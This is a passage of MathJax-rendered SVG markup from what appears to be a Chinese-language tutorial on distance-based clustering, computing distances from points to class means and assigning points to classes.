48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(9829.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10496.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(11552.4,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(13330.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(13775.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(14295.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(14684.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(15692.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(16137.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(18002,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(18668.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(19724.6,0)"><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z"></path></g></g></g></svg></mjx-container>，将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.339ex" role="img" focusable="false" viewBox="0 -442 1008.6 592"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>。</p><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="46.888ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 20724.6 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5158.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5603,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6123,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(6512,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(7520.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(7965.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(9829.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10496.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(11552.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(1000,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(1278,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1778,0)"></path></g><g data-mml-node="mo" transform="translate(13830.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(14275.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 